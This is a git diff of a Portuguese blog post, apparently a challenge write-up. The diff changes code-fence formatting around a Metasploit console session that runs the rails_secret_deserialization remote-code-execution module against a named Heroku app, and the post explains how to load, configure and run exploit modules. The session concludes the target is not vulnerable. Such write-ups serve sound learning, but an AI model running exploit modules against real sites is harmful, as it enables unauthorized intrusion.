@@ -20,7 +20,7 @@ Instalar o Metasploit no seu sistema é simples. Este [blog post](http://www.dar
 
 No final, você deve ter o metasploit instalado e com o comando <tt>msfconsole</tt> a partir de onde já dá pra começar a brincar. Por exemplo, uma das coisas que eu tentei ver foi se o aplicativo do desafio sofria o problema de remote code execution que mencionei acima, pra isso, uma vez dentro do console eu fiz:
 
----
+```
 msf exploit(rails_json_yaml_code_exec) > use exploit/multi/http/rails_secret_deserialization
 msf exploit(rails_secret_deserialization) > set RHOST getthisadmin.herokuapp.com
 msf exploit(rails_secret_deserialization) > set TARGETURI /reset/_csrf_token
@@ -31,7 +31,7 @@ msf exploit(rails_secret_deserialization) > run
 [*] Trying to leverage default controller without cookie confirmation.
 [*] Sending cookie _csrf_token
 msf exploit(rails_secret_deserialization) > exit
----
+```
 
 E podemos ver que o problema não é esse. No Metasploit você carrega um dos muitos módulos de exploit que quer explorar (veja [lista no próprio código fonte](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/multi/http)). Cada exploit tem várias opções pra configurar (execute <tt>show options</tt> para mostrar as configurações). Use o comando <tt>set</tt> para configurar com o site que quer explorar. Finalmente, rode com <tt>run</tt> para executar e ver se tem o exploit ou não.
 
